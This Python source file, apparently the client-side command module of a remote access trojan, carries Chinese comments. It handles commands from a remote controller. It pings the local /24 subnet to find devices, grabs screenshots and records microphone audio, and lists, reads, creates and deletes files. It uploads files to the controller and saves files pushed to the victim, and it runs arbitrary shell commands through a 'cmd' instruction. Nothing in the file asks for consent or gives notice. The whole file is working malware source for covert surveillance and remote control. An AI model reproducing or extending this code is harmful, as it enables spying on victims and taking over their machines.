#client\commands.py
import os
import platform
import socket
import subprocess
import ipaddress
from PIL import ImageGrab  # 截屏功能（仅支持 Windows 和 macOS）
import wave
import pyaudio

def get_local_ip():
    """获取本地 IP 地址"""
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip


def scan_network():
    """扫描内网设备，返回在线设备的 IP 地址列表"""
    try:
        # 获取本地 IP 和子网范围
        local_ip = get_local_ip()
        network = ipaddress.ip_network(f"{local_ip}/24", strict=False)  # 假设子网掩码为 /24

        print(f"[INFO] 正在扫描局域网 IP 范围：{network}")

        # 扫描在线设备
        online_devices = []
        for ip in network:
            ip = str(ip)
            # Ping 每个 IP 地址
            if os.name == "nt":  # Windows 使用 `ping -n 1`
                command = f"ping -n 1 -w 100 {ip}"
            else:  # Linux/macOS 使用 `ping -c 1`
                command = f"ping -c 1 -W 1 {ip}"
            result = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL)
            if result.returncode == 0:  # 如果 Ping 成功
                online_devices.append(ip)

        return f"在线设备：\n" + "\n".join(online_devices)
    except Exception as e:
        return f"[ERROR] 扫描内网设备出错：{e}"



def take_screenshot():
    """
    截屏功能：保存截图到本地并返回文件路径
    """
    try:
        if platform.system() not in ["Windows", "Darwin"]:  # 检查操作系统是否支持
            return "[ERROR] 当前操作系统不支持截屏功能"

        screenshot = ImageGrab.grab()
        save_path = os.path.join(os.getcwd(), "screenshot.png")  # 保存到当前目录
        screenshot.save(save_path)
        return f"[INFO] 截屏完成，保存路径：{save_path}"
    except Exception as e:
        return f"[ERROR] 截屏失败：{e}"
    
def record_audio(duration=5):
    """
    录音功能：录制音频并保存到本地
    :param duration: 录音时长（秒）
    """
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []

        print("[INFO] 正在录音中...")
        for _ in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        save_path = os.path.join(os.getcwd(), "recording.wav")
        with wave.open(save_path, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b"".join(frames))

        return f"[INFO] 录音完成，保存路径：{save_path}"
    except Exception as e:
        return f"[ERROR] 录音失败：{e}"

def list_files(directory="."):
    """
    列出指定目录的内容
    :param directory: 目标目录
    """
    try:
        files = os.listdir(directory)
        return "[INFO] 目录内容：\n" + "\n".join(files)
    except Exception as e:
        return f"[ERROR] 读取目录失败：{e}"


def create_file(file_path):
    """
    创建一个新文件
    :param file_path: 文件路径
    """
    try:
        with open(file_path, "w") as f:
            f.write("")  # 创建空文件
        return f"[INFO] 文件已创建：{file_path}"
    except Exception as e:
        return f"[ERROR] 创建文件失败：{e}"


def delete_file(file_path):
    """
    删除文件或文件夹
    :param file_path: 文件或文件夹路径
    """
    try:
        if os.path.isfile(file_path):
            os.remove(file_path)
            return f"[INFO] 文件已删除：{file_path}"
        elif os.path.isdir(file_path):
            os.rmdir(file_path)
            return f"[INFO] 文件夹已删除：{file_path}"
        else:
            return "[ERROR] 文件或文件夹不存在"
    except Exception as e:
        return f"[ERROR] 删除失败：{e}"


def read_file(file_path):
    """尝试读取文件内容，支持多种编码"""
    encodings = ["utf-8", "gbk", "iso-8859-1", "shift_jis", "latin1"]
    try:
        if not os.path.isfile(file_path):
            return "[ERROR] 文件不存在"

        for encoding in encodings:
            try:
                with open(file_path, "r", encoding=encoding) as f:
                    content = f.read()
                return f"[INFO] 文件内容（使用 {encoding} 编码）：\n{content}"
            except UnicodeDecodeError:
                continue

        return "[ERROR] 文件无法用常见编码解码，可能是二进制文件或其他特殊编码。"
    except Exception as e:
        return f"[ERROR] 读取文件失败：{e}"

def upload_file(file_path):
    """读取文件内容"""
    try:
        if not os.path.isfile(file_path):
            return None, "[ERROR] 文件不存在"
        with open(file_path, 'rb') as f:
            file_data = f.read()
        return file_data, f"[INFO] 文件读取成功：{file_path}"
    except Exception as e:
        return None, f"[ERROR] 无法读取文件：{e}"

def download_file(file_path, file_data):
    """保存文件内容"""
    try:
        with open(file_path, 'wb') as f:
            f.write(file_data)
        return f"[INFO] 文件已保存：{file_path}"
    except Exception as e:
        return f"[ERROR] 无法保存文件：{e}"

def execute_command(command):
    """
    执行命令
    """
    try:
        command_str = command.decode('utf-8')
        if command_str.startswith('upload'):
            file_path = command_str[7:].strip()
            file_data, message = upload_file(file_path)
            if file_data:
                return file_data  # 返回文件数据 (bytes)
            else:
                return message.encode('utf-8')  # 返回错误信息 (bytes)
            
        elif command_str.startswith('download'):
                    file_path = os.path.basename(command_str[9:].strip())
                    # 告诉服务端已经准备好接收文件
                    return b"ready_to_receive:" + file_path.encode('utf-8')
        else:
            # 原有的命令处理
            if command_str.lower() == "info":
                os_info = platform.platform()
                hostname = platform.node()
                return f"OS: {os_info}, Hostname: {hostname}".encode('utf-8')
            elif command_str.lower() == "screenshot":
                result = take_screenshot()
                return result.encode('utf-8')
            elif command_str.lower().startswith("record"):
                duration = int(command_str.split(" ")[1]) if len(command_str.split()) > 1 else 5
                result = record_audio(duration)
                return result.encode('utf-8')
            elif command_str.lower().startswith("list"):
                directory = command_str[5:].strip() if len(command_str) > 5 else "."
                result = list_files(directory)
                return result.encode('utf-8')
            elif command_str.lower().startswith("create"):
                file_path = command_str[7:].strip()
                result = create_file(file_path)
                return result.encode('utf-8')
            elif command_str.lower().startswith("delete"):
                file_path = command_str[7:].strip()
                result = delete_file(file_path)
                return result.encode('utf-8')
            elif command_str.lower().startswith("read"):
                file_path = command_str[5:].strip()
                result = read_file(file_path)
                return result.encode('utf-8')
            elif command_str.startswith("cmd"):
                system_command = command_str[4:].strip()
                if not system_command:
                    return "[ERROR] 请在 cmd 后输入系统命令".encode('utf-8')
                process = subprocess.Popen(
                    system_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                stdout, stderr = process.communicate(timeout=10)
                if process.returncode == 0:
                    return (stdout.strip() if stdout else "[INFO] 命令执行成功，无输出").encode('utf-8')
                else:
                    return (stderr.strip() if stderr else "[ERROR] 命令执行失败").encode('utf-8')
            else:
                return f"[ERROR] 未知指令：{command_str}".encode('utf-8')
    except subprocess.TimeoutExpired:
        return "[ERROR] 命令执行超时".encode('utf-8')
    except Exception as e:
        error_message = f"[ERROR] 执行命令出错：{e}"
        return error_message.encode('utf-8')